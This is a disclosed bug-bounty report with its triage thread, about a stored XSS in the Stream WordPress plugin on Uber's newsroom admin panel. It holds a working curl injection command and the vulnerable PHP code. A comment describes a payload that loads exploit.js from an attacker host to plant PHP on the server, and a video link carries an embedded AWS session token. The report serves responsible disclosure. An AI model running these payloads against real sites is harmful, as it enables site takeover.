{"id":127948,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMjc5NDg=","url":"https://hackerone.com/reports/127948","title":"Stored XSS on newsroom.uber.com admin panel / Stream WordPress plugin","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2016-04-03T09:22:57.277Z","submitted_at":"2016-04-03T09:22:57.277Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"jouko","url":"/jouko","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/013/642/e4fdbdb735ac2b938c6eb072303166bc708a9a50_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":314,"url":"https://hackerone.com/uber","handle":"uber","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/314/24ea21370a71b18eafb5722d5855825ab622b5dd_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/314/24ea21370a71b18eafb5722d5855825ab622b5dd_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Uber","twitter_handle":"","website":"https://www.uber.com","about":""}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2016-07-27T19:39:41.866Z","bug_reporter_agreed_on_going_public_at":"2016-07-27T19:39:41.718Z","team_member_agreed_on_going_public_at":"2016-07-27T17:46:15.472Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"*newsroom.uber.com* uses a WordPress plugin called Stream to log user activity. In some cases the logged events aren't sanitized properly and can contain HTML tags and JavaScript. An unauthenticated user can produce such a log message to inject JavaScript in the admin panel. When an administrator views the log, the script would be evaluated with administrator privilegs and can (under normal setup) be further used to inject attacker-supplied PHP code on the server.\n\n#Reproducing#\nThe following command line can be used to inject JavaScript in the log with the *curl* tool:\n~~~~\ncurl -v -H 'Referer: /hello?plugin-editor.php\u0026file=aaa%3cscript%3ealert(%27stored%20xss%27);%3c/script%3e' --data 'post-password=foo' 'https://newsroom.uber.com/wp-login.php?action=postpass'\n~~~~\nNext, if an administrator clicks the Stream tab in the WordPress Dashboard, an alert box should pop up.\n\n#Details#\nThe Stream plugin hooks many WordPress events to log user activity. In the file *connectors/installer.php* there is a *wp_redirect()* hook - the plugin checks every URL redirection to see if it involved the plugin editor. The code, compacted a bit:\n\n~~~~php\n        public static function callback_wp_redirect( $location ) {\n                if ( ! preg_match( '#(plugin)-editor.php#', $location, $match ) ) {\n                        return $location;\n                }\n                $type = $match[1];\n                list( $url, $query ) = explode( '?', $location );\n                $query = wp_parse_args( $query );\n                $file  = $query['file'];\n                if ( empty( $query['file'] ) ) {\n                        return $location;\n                }\n                /* SNIP ... */ elseif ( 'plugin' === $type ) {\n                        global $plugin, $plugins;\n                        $plugin_base = current( explode( '/', $plugin ) );\n                        foreach ( $plugins as $key =\u003e $plugin_data ) {\n                                if ( $plugin_base === current( explode( '/', $key ) ) ) {\n                                        $name = $plugin_data['Name'];\n                                        break;\n                                }\n                        }\n                }\n                self::log(\n                        _x(\n                                'Edited %1$s: %2$s',\n                                'Plugin/theme editing. 1: Type (plugin/theme), 2: Plugin/theme name',\n                                'stream'\n                        ),\n                        compact( 'type', 'name', 'file' ),null, array( $type . 's' =\u003e 'edited' ));\n\n~~~~\nSo if there is a redirect to a URL containing the string \"plugin-editor.php\" with a *file* query parameter, then the activity is logged. The *file* query parameter is included in the log entry.\n\nThe event is saved in Stream's database table and shown on the main tab of the plugin without sufficient HTML sanitizing.\n\nThere are many ways to generate an HTTP redirect in WordPress. The method used in the above example is requesting *wp-login.php* which, with appropriate arguments, redirects the browser back to the Referer: header's value.\n\n#Impact#\nThe JavaScript stored by an unauthenticated attacker would get executed with administrator privileges, thus having full control over the site contents. Under a normal WordPress setup it could also modify existing PHP files via the plugin or theme editors, leading to server-side compromise.\n\nI tested this on my local test system with the latest WordPress and Stream 1.4.9.","vulnerability_information_html":"\u003cp\u003e\u003cem\u003enewsroom.uber.com\u003c/em\u003e uses a WordPress plugin called Stream to log user activity. In some cases the logged events aren\u0026#39;t sanitized properly and can contain HTML tags and JavaScript. An unauthenticated user can produce such a log message to inject JavaScript in the admin panel. When an administrator views the log, the script would be evaluated with administrator privilegs and can (under normal setup) be further used to inject attacker-supplied PHP code on the server.\u003c/p\u003e\n\n\u003ch1 id=\"reproducing\"\u003eReproducing\u003c/h1\u003e\n\n\u003cp\u003eThe following command line can be used to inject JavaScript in the log with the \u003cem\u003ecurl\u003c/em\u003e tool:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ecurl -v -H \u0026#39;Referer: /hello?plugin-editor.php\u0026amp;file=aaa%3cscript%3ealert(%27stored%20xss%27);%3c/script%3e\u0026#39; --data \u0026#39;post-password=foo\u0026#39; \u0026#39;https://newsroom.uber.com/wp-login.php?action=postpass\u0026#39;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eNext, if an administrator clicks the Stream tab in the WordPress Dashboard, an alert box should pop up.\u003c/p\u003e\n\n\u003ch1 id=\"details\"\u003eDetails\u003c/h1\u003e\n\n\u003cp\u003eThe Stream plugin hooks many WordPress events to log user activity. In the file \u003cem\u003econnectors/installer.php\u003c/em\u003e there is a \u003cem\u003ewp_redirect()\u003c/em\u003e hook - the plugin checks every URL redirection to see if it involved the plugin editor. The code, compacted a bit:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight php\"\u003e\u003ccode\u003e        \u003cspan class=\"k\"\u003epublic\u003c/span\u003e \u003cspan class=\"k\"\u003estatic\u003c/span\u003e \u003cspan class=\"k\"\u003efunction\u003c/span\u003e \u003cspan class=\"nf\"\u003ecallback_wp_redirect\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e \u003cspan class=\"nv\"\u003e$location\u003c/span\u003e \u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n                \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e \u003cspan class=\"o\"\u003e!\u003c/span\u003e \u003cspan class=\"nb\"\u003epreg_match\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;#(plugin)-editor.php#\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nv\"\u003e$location\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nv\"\u003e$match\u003c/span\u003e \u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n                        \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"nv\"\u003e$location\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n                \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n                \u003cspan class=\"nv\"\u003e$type\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nv\"\u003e$match\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e];\u003c/span\u003e\n                \u003cspan class=\"k\"\u003elist\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e \u003cspan class=\"nv\"\u003e$url\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nv\"\u003e$query\u003c/span\u003e \u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003eexplode\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;?\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nv\"\u003e$location\u003c/span\u003e \u003cspan class=\"p\"\u003e);\u003c/span\u003e\n                \u003cspan class=\"nv\"\u003e$query\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003ewp_parse_args\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e \u003cspan class=\"nv\"\u003e$query\u003c/span\u003e \u003cspan class=\"p\"\u003e);\u003c/span\u003e\n                \u003cspan class=\"nv\"\u003e$file\u003c/span\u003e  \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nv\"\u003e$query\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;file\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e];\u003c/span\u003e\n                \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e \u003cspan class=\"k\"\u003eempty\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e \u003cspan class=\"nv\"\u003e$query\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;file\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n                        \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"nv\"\u003e$location\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n                \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n                \u003cspan class=\"cm\"\u003e/* SNIP ... */\u003c/span\u003e \u003cspan class=\"k\"\u003eelseif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;plugin\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e===\u003c/span\u003e \u003cspan class=\"nv\"\u003e$type\u003c/span\u003e \u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n                        \u003cspan class=\"k\"\u003eglobal\u003c/span\u003e \u003cspan class=\"nv\"\u003e$plugin\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nv\"\u003e$plugins\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n                        \u003cspan class=\"nv\"\u003e$plugin_base\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003ecurrent\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e \u003cspan class=\"nb\"\u003eexplode\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;/\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nv\"\u003e$plugin\u003c/span\u003e \u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e);\u003c/span\u003e\n                        \u003cspan class=\"k\"\u003eforeach\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e \u003cspan class=\"nv\"\u003e$plugins\u003c/span\u003e \u003cspan class=\"k\"\u003eas\u003c/span\u003e \u003cspan class=\"nv\"\u003e$key\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"nv\"\u003e$plugin_data\u003c/span\u003e \u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n                                \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e \u003cspan class=\"nv\"\u003e$plugin_base\u003c/span\u003e \u003cspan class=\"o\"\u003e===\u003c/span\u003e \u003cspan class=\"nb\"\u003ecurrent\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e \u003cspan class=\"nb\"\u003eexplode\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;/\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nv\"\u003e$key\u003c/span\u003e \u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n                                        \u003cspan class=\"nv\"\u003e$name\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nv\"\u003e$plugin_data\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;Name\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e];\u003c/span\u003e\n                                        \u003cspan class=\"k\"\u003ebreak\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n                                \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n                        \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n                \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n                \u003cspan class=\"nx\"\u003eself\u003c/span\u003e\u003cspan class=\"o\"\u003e::\u003c/span\u003e\u003cspan class=\"na\"\u003elog\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\n                        \u003cspan class=\"nx\"\u003e_x\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\n                                \u003cspan class=\"s1\"\u003e\u0026#39;Edited %1$s: %2$s\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n                                \u003cspan class=\"s1\"\u003e\u0026#39;Plugin/theme editing. 1: Type (plugin/theme), 2: Plugin/theme name\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n                                \u003cspan class=\"s1\"\u003e\u0026#39;stream\u0026#39;\u003c/span\u003e\n                        \u003cspan class=\"p\"\u003e),\u003c/span\u003e\n                        \u003cspan class=\"nb\"\u003ecompact\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;type\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;name\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;file\u0026#39;\u003c/span\u003e \u003cspan class=\"p\"\u003e),\u003c/span\u003e\u003cspan class=\"kc\"\u003enull\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"k\"\u003earray\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e \u003cspan class=\"nv\"\u003e$type\u003c/span\u003e \u003cspan class=\"o\"\u003e.\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;s\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;edited\u0026#39;\u003c/span\u003e \u003cspan class=\"p\"\u003e));\u003c/span\u003e\n\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eSo if there is a redirect to a URL containing the string \u0026quot;plugin-editor.php\u0026quot; with a \u003cem\u003efile\u003c/em\u003e query parameter, then the activity is logged. The \u003cem\u003efile\u003c/em\u003e query parameter is included in the log entry.\u003c/p\u003e\n\n\u003cp\u003eThe event is saved in Stream\u0026#39;s database table and shown on the main tab of the plugin without sufficient HTML sanitizing.\u003c/p\u003e\n\n\u003cp\u003eThere are many ways to generate an HTTP redirect in WordPress. The method used in the above example is requesting \u003cem\u003ewp-login.php\u003c/em\u003e which, with appropriate arguments, redirects the browser back to the Referer: header\u0026#39;s value.\u003c/p\u003e\n\n\u003ch1 id=\"impact\"\u003eImpact\u003c/h1\u003e\n\n\u003cp\u003eThe JavaScript stored by an unauthenticated attacker would get executed with administrator privileges, thus having full control over the site contents. Under a normal WordPress setup it could also modify existing PHP files via the plugin or theme editors, leading to server-side compromise.\u003c/p\u003e\n\n\u003cp\u003eI tested this on my local test system with the latest WordPress and Stream 1.4.9.\u003c/p\u003e\n","bounty_amount":"5000.0","formatted_bounty":"$5,000","weakness":{"id":60,"name":"Cross-site Scripting (XSS) - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2016-08-26T17:46:15.549Z","allow_singular_disclosure_after":-136982247.37801835,"singular_disclosure_allowed":true,"vote_count":17,"voters":["delimitry","michiel","shailesh4594","bogdantcaciuc","muhammad_uwais","vijay_kumar","japz","sumit7","secbughunter","spetr0x","and 7 more..."],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":888684,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"Hello @jouko,\n\nThank you for your report. Can you demonstrate a location where this XSS vulnerability is possible? Does this XSS effect Uber users or just the admins? Also, do you have any suggested ways to mitigate this issue?  A proof of concept with pictures and or video would also be helpful in confirming this issue.\n\nThank you for thinking of Uber security.","markdown_message":"\u003cp\u003eHello \u003ca href=\"/jouko\"\u003e@jouko\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eThank you for your report. Can you demonstrate a location where this XSS vulnerability is possible? Does this XSS effect Uber users or just the admins? Also, do you have any suggested ways to mitigate this issue?  A proof of concept with pictures and or video would also be helpful in confirming this issue.\u003c/p\u003e\n\n\u003cp\u003eThank you for thinking of Uber security.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-04-04T22:38:49.929Z","updated_at":"2016-04-04T22:38:49.929Z","actor":{"username":"bugtriage-josh","cleared":false,"url":"/bugtriage-josh","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":888816,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"It is a stored XSS against logged in WordPress users only. After my tests there should be some injected \u003cscript\u003e and \u003cimg\u003e tags visible on the page https://newsroom.uber.com/wp-admin/admin.php?page=wp_stream (unless there is a lot of other tracked activity that has pushed them away from the latest activity).\n\nFor mitigating: I have been in contact with Stream authors. They (Luke Carbis) indicated yesterday that they are working on a patch and press release as soon as possible. After that, updating the plugin to the latest version will fix the problem. I can make a video that demonstrates how this can be exploited for server-side compromise.","markdown_message":"\u003cp\u003eIt is a stored XSS against logged in WordPress users only. After my tests there should be some injected \u0026lt;script\u0026gt; and \u0026lt;img\u0026gt; tags visible on the page \u003ca title=\"https://newsroom.uber.com/wp-admin/admin.php?page=wp_stream\" href=\"/redirect?url=https%3A%2F%2Fnewsroom.uber.com%2Fwp-admin%2Fadmin.php%3Fpage%3Dwp_stream\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://newsroom.uber.com/wp-admin/admin.php?page=wp_stream\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e (unless there is a lot of other tracked activity that has pushed them away from the latest activity).\u003c/p\u003e\n\n\u003cp\u003eFor mitigating: I have been in contact with Stream authors. They (Luke Carbis) indicated yesterday that they are working on a patch and press release as soon as possible. After that, updating the plugin to the latest version will fix the problem. I can make a video that demonstrates how this can be exploited for server-side compromise.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-04-05T00:08:02.748Z","updated_at":"2016-04-05T00:08:02.748Z","actor":{"username":"jouko","cleared":false,"url":"/jouko","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/642/e4fdbdb735ac2b938c6eb072303166bc708a9a50_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":888875,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Here's a quick video I made about this bug. It shows two exploits against a WordPress test system running Stream 1.4.9. The exploits work as described in the original report: they generate a HTTP redirect which the Stream plugin mistakes for an administrative action that has to be tracked and logged. The event contains injected \u003cscript\u003e tags.\n\nThe first example just shows an alert box to any administrator who views the Stream event log.\nThe second example injects \u003cscript src=\"https://attacker.site/exploit.js\"\u003e\u003c/script\u003e to load a longer payload script. The payload script uses WordPress AJAX facilities to write attacker-supplied PHP code on the server.","markdown_message":"\u003cp\u003eHere\u0026#39;s a quick video I made about this bug. It shows two exploits against a WordPress test system running Stream 1.4.9. The exploits work as described in the original report: they generate a HTTP redirect which the Stream plugin mistakes for an administrative action that has to be tracked and logged. The event contains injected \u0026lt;script\u0026gt; tags.\u003c/p\u003e\n\n\u003cp\u003eThe first example just shows an alert box to any administrator who views the Stream event log.\u003cbr\u003e\nThe second example injects \u0026lt;script src=\u0026quot;https://attacker.site/exploit.js\u0026quot;\u0026gt;\u0026lt;/script\u0026gt; to load a longer payload script. The payload script uses WordPress AJAX facilities to write attacker-supplied PHP code on the server.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-04-05T01:28:45.047Z","updated_at":"2016-04-05T01:29:02.536Z","actor":{"username":"jouko","cleared":false,"url":"/jouko","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/642/e4fdbdb735ac2b938c6eb072303166bc708a9a50_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"attachments":[{"id":83223,"filename":"stream.mp4","type":"video/mp4","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/083/223/598dc7be0895c13e1ae569dddb80d4ebc8f19129/stream.mp4?response-content-disposition=attachment%3B%20filename%3D%22stream.mp4%22%3B%20filename%2A%3DUTF-8%27%27stream.mp4\u0026response-content-type=video%2Fmp4\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ6SZWJ7EV%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T042342Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDnUzI%2BFGOFBLAScWuVOL4Lj3JmbbQAzP3Z0CGixtLCuAIgQzjjEEfRLfyvyTUcWPuh1TmLwtvXfhn4Y1cmYaMrO6cqtAMIVRABGgwwMTM2MTkyNzQ4NDkiDGp%2BpnVA5musWTL7NCqRA8%2FtWDfuTNl%2BTEZ8%2F83sOgEjGfhPO7hqas9S5YFvyrG29udKPmtcuewMHQFGoWh6uvbSTE9LPEkFDl6RosJJJY3ZsFaD9BGxtIOBINUPfZd26XnOL01fuCQ8x%2BiErJvv8vHBR5mWXV7L6t7A2%2F5H8dY91iEQFmPdZboRnRed4t2q9jcZCwrkzHwMk8bNRFkfRqzqUB6%2Buk39e4oyKwiyqROwDwnoUxIOrVdA29STuUYzszGBQ%2B3Eg%2Fr4I9Ys7sDaoYDHJAVEt%2F6kVnewTLU3uHfL%2F%2FzDR0ZnJa5Oo%2BmValn4%2Fn34Ke7o7csnn3piiGYIK4mihEWUVtJZnq0bZ%2BEU14q4ZLfb79tvTTKy5%2B9XC3vM1tWdFU6K%2F2PISAY5LoVEscNgJL0aQIq7sAX0f00Uyo2TeQTR%2B9TUOeUvW40metpNAt6ZQ8u0%2BuTZij%2FLNaYEe6v5RA7Fg8wzm%2Bu7IVusddMT4HgUuba3afxdFVj8x9iXROa6QZZ%2BdlHYNGywE8eJxO3jkpwbaZpUg8PZ17ztcb5%2BMLHSqv8FOusBshs3Z1RNetRK0o6yVAL2zGdldUlxbnMrusEP31v5WyfcSXKYrW1oJGSAAOlTEHZOawyDOEVKZdmLftLsa7vpv4NkkvDc0MjvNZjQrLWiuTmEalVC704buBLYftchmedTLOrsCMIpwWkxoPJnEqO2VZwPnup4B1lMH%2B%2FHO0btRwbDEfX1bZu7nae%2FPoCvN9o%2FT1iQ8GcaSv5OUJxppuy2cagjSuiUWEkOXPhYiBKpxTQMFIMtd6%2FpRtJ2YeCQgmRXXl1K6ayBDQAQxWFeKQPM5vtrAzDrzE9Adaqtb3AdlxqDjg74xdcM9YFdyg%3D%3D\u0026X-Amz-Signature=82a7d614e45c5c8b50ff8f5151f211e55266e83c7dde0852c680fc50f9186897"}],"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":894220,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","markdown_message":"","automated_response":false,"created_at":"2016-04-07T16:53:28.532Z","updated_at":"2016-04-07T16:53:28.532Z","actor":{"username":"notcollin","cleared":false,"url":"/notcollin","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":901845,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"These ones are a bit slower to fix as they are partially managed by a company outside uber - so ive pinged them a number (4) times to fix this and still working to push the issue with them. Sorry but this one will likely take a while to fix (even though the fix is trivial) :(","markdown_message":"\u003cp\u003eThese ones are a bit slower to fix as they are partially managed by a company outside uber - so ive pinged them a number (4) times to fix this and still working to push the issue with them. Sorry but this one will likely take a while to fix (even though the fix is trivial) :(\u003c/p\u003e\n","automated_response":false,"created_at":"2016-04-12T18:16:57.585Z","updated_at":"2016-04-12T18:16:57.585Z","actor":{"username":"notcollin","cleared":false,"url":"/notcollin","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":901846,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"You were the first to find though, fyi","markdown_message":"\u003cp\u003eYou were the first to find though, fyi\u003c/p\u003e\n","automated_response":false,"created_at":"2016-04-12T18:17:17.577Z","updated_at":"2016-04-12T18:17:17.577Z","actor":{"username":"notcollin","cleared":false,"url":"/notcollin","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":928550,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Note that also https://transparencyreport.uber.com/ uses a vulnerable Stream plugin.","markdown_message":"\u003cp\u003eNote that also \u003ca title=\"https://transparencyreport.uber.com/\" href=\"/redirect?url=https%3A%2F%2Ftransparencyreport.uber.com%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://transparencyreport.uber.com/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e uses a vulnerable Stream plugin.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-04-26T12:20:17.891Z","updated_at":"2016-04-26T12:20:17.891Z","actor":{"username":"jouko","cleared":false,"url":"/jouko","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/642/e4fdbdb735ac2b938c6eb072303166bc708a9a50_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":994501,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"This should be fixed in the latest version of Stream, 3.0.6.","markdown_message":"\u003cp\u003eThis should be fixed in the latest version of Stream, 